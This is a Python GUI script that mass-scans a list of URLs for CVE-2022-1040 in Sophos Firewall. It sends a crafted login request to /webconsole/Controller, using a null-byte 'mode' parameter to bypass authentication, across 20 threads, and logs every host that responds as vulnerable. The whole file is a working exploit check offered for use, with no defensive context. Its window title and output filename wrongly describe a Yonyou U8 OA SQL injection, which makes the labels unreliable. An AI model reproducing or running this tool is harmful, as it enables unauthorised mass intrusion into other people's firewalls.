import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def sophos_firewall_rce_cve_2022_1040_exp(url):
    poc = r"""/webconsole/Controller"""
    url = url + poc
    data = r"""mode=151&json={"username"%3a"admin","password"%3a"somethingnotpassword","languageid"%3a"1","browser"%3a"Chrome_101","accessaction"%3a1,+"mode\u0000"%3a716}&__RequestType=ajax&t=1653896534066"""
    try:
        res = requests.post(url, data=data,verify=False,timeout=3)
        if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
            sophos_firewall_rce_cve_2022_1040_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            sophos_firewall_rce_cve_2022_1040_text.see(END)
            with open ("存在用友U8OAtest_jspSQL注入漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            sophos_firewall_rce_cve_2022_1040_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            sophos_firewall_rce_cve_2022_1040_text.see(END)
    except Exception as err:
        sophos_firewall_rce_cve_2022_1040_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        sophos_firewall_rce_cve_2022_1040_text.see(END)
def get_sophos_firewall_rce_cve_2022_1040_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def sophos_firewall_rce_cve_2022_1040_gui():
    sophos_firewall_rce_cve_2022_1040 = tk.Tk()
    sophos_firewall_rce_cve_2022_1040.geometry("910x450")
    sophos_firewall_rce_cve_2022_1040.title("用友 U8 OA test.jsp SQL注入漏洞一把梭")
    sophos_firewall_rce_cve_2022_1040.resizable(0, 0)
    sophos_firewall_rce_cve_2022_1040.iconbitmap('logo.ico')
    global sophos_firewall_rce_cve_2022_1040_text
    sophos_firewall_rce_cve_2022_1040_text = scrolledtext.ScrolledText(sophos_firewall_rce_cve_2022_1040,width=123, height=25)
    sophos_firewall_rce_cve_2022_1040_text.grid(row=0, column=0, padx=10, pady=10)
    sophos_firewall_rce_cve_2022_1040_text.see(END)
    addrs = get_sophos_firewall_rce_cve_2022_1040_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(sophos_firewall_rce_cve_2022_1040_exp, addr)
    sophos_firewall_rce_cve_2022_1040.mainloop()